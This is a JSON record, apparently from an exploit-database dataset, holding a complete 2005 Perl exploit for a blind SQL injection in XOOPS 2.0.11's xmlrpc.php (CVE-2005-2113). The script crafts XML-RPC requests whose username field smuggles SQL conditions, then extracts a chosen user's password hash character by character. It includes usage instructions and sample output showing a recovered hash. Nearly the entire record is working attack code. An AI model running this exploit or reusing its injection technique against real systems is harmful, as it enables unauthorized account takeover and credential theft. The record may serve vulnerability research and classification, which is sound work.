{
  "id": "1082",
  "title": "XOOPS 2.0.11 - &#039;xmlrpc.php&#039; SQL Injection",
  "cve": "CVE-2005-2113",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\n## Xoops <= 2.0.11 xmlrpc.php sql injection exploit by RST/GHC\r\n## based on http://www.gulftech.org/?node=research&article_id=00086-06292005\r\n## coded by 1dt.w0lf\r\n## RST/GHC\r\n## http://rst.void.ru \r\n## http://ghc.ru\r\n\r\n## example:\r\n## r57xoops.pl -u http://www.xoops2.ru/xmlrpc.php -n Alexxus\r\n## ---------------------------------------------------------------\r\n##   Xoops <= 2.0.11 xmlrpc.php sql injection exploit by RST/GHC\r\n## ---------------------------------------------------------------\r\n## [~]  URL : http://www.xoops2.ru/xmlrpc.php\r\n## [~] NAME : Alexxus\r\n## [~] SEARCHING PASSWORD ... [ DONE ]\r\n## ---------------------------------------------------------------\r\n##  USER NAME : Alexxus\r\n##  USER HASH : a26c7baaa40ab863f9b22c8649427fa6\r\n## ---------------------------------------------------------------\r\n\r\nuse LWP::UserAgent;\r\nuse Getopt::Std;\r\n\r\ngetopts('u:n:');\r\n\r\n$url  = $opt_u;\r\n$name = $opt_n;\r\n\r\nif(!$url || !$name) { &usage; }\r\n\r\n$s_num = 1;\r\n$|++;\r\n$n = 0;\r\n&head;\r\nprint \"\\r\\n\";\r\nprint \" [~]  URL : $url\\r\\n\";\r\nprint \" [~] NAME : $name\\r\\n\";\r\nprint \" [~] SEARCHING PASSWORD ... [|]\";\r\n\r\nwhile(1)\r\n{\r\nif(&found(47,58)==0) { &found(96,103); } \r\n$char = $i;\r\nif ($char==\"0\") \r\n { \r\n if(length($allchar) > 0){\r\n print qq{\\b\\b DONE ] \r\n ---------------------------------------------------------------\r\n  USER NAME : $name\r\n  USER HASH : $allchar\r\n ---------------------------------------------------------------\r\n };\r\n }\r\n else\r\n {\r\n print \"\\b\\b FAILED ]\";\r\n }\r\n exit();  \r\n }\r\nelse \r\n {  \r\n $allchar .= chr($char); \r\n }\r\n$s_num++;\r\n}\r\n\r\nsub found($$)\r\n {\r\n my $fmin = $_[0];\r\n my $fmax = $_[1];\r\n if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }\r\n \r\n $r = int($fmax - ($fmax-$fmin)/2);\r\n $check = \"/**/BETWEEN/**/$r/**/AND/**/$fmax\";\r\n if ( &check($check) ) { &found($r,$fmax); }\r\n else { &found($fmin,$r); }\r\n }\r\n \r\nsub crack($$)\r\n {\r\n my $cmin = $_[0];\r\n my $cmax = $_[1];\r\n $i = $cmin;\r\n while ($i<$cmax)\r\n  {\r\n  $crcheck = \"=$i\";\r\n  if ( &check($crcheck) ) { return $i; }\r\n  $i++;\r\n  }\r\n $i = 0;\r\n return $i;\r\n }\r\n \r\nsub check($)\r\n {\r\n $n++;\r\n status();\r\n $ccheck = $_[0]; \r\n\r\n $data  = '<?xml version=\"1.0\"?>';\r\n $data .= '<methodCall>';\r\n $data .= '<methodName>blogger.getUsersBlogs</methodName>';\r\n $data .= '<params>';\r\n $data .= '<param>';\r\n $data .= '<value><string></string></value>';\r\n $data .= '</param>';\r\n $data .= '<param>';\r\n $data .= '<value><string>'.$name.'\\' AND ascii(substring(pass,'.$s_num.',1))'.$ccheck.')/*</string></value>';\r\n $data .= '</param>';\r\n $data .= '</params>';\r\n $data .= '</methodCall>';\r\n\r\n $req = new HTTP::Request 'POST' => $url;\r\n $req->content_type('application/xml');\r\n $req->content($data);\r\n $ua = new LWP::UserAgent;\r\n $res = $ua->request($req);\r\n $reply= $res->content;\r\n if($reply =~ /Selected blog application does not exist/) { print \"\\n [-] NEWS BLOG DOES NOT EXIST =(\\n [-] EXPLOIT FAILED!\\n\"; exit(); }\r\n if($reply =~ /User authentication failed/) { return 0; }\r\n else { return 1; }\r\n }\r\n \r\nsub status()\r\n{\r\n  $status = $n % 5;\r\n  if($status==0){ print \"\\b\\b/]\";  }\r\n  if($status==1){ print \"\\b\\b-]\";  }\r\n  if($status==2){ print \"\\b\\b\\\\]\"; }\r\n  if($status==3){ print \"\\b\\b|]\";  }\r\n}\r\n\r\nsub usage()\r\n {\r\n &head;\r\n print q(\r\n  USAGE:\r\n  r57xoops.pl [OPTIONS]\r\n  \r\n  OPTIONS:\r\n  -u [URL]      - path to xmlrpc.php\r\n  -n [USERNAME] - user for bruteforce\r\n  \r\n  E.G.\r\n  r57xoops.pl -u http://server/xoops/xmlrpc.php -n admin\r\n ---------------------------------------------------------------\r\n (c)oded by 1dt.w0lf\r\n RST/GHC , http://rst.void.ru , http://ghc.ru\r\n );\r\n exit();\r\n }\r\nsub head()\r\n {\r\n print q(\r\n ---------------------------------------------------------------\r\n   Xoops <= 2.0.11 xmlrpc.php sql injection exploit by RST/GHC\r\n ---------------------------------------------------------------\r\n );\r\n }\r\n\r\n# milw0rm.com [2005-07-04]",
  "url": "https://www.exploit-db.com/exploits/1082"
}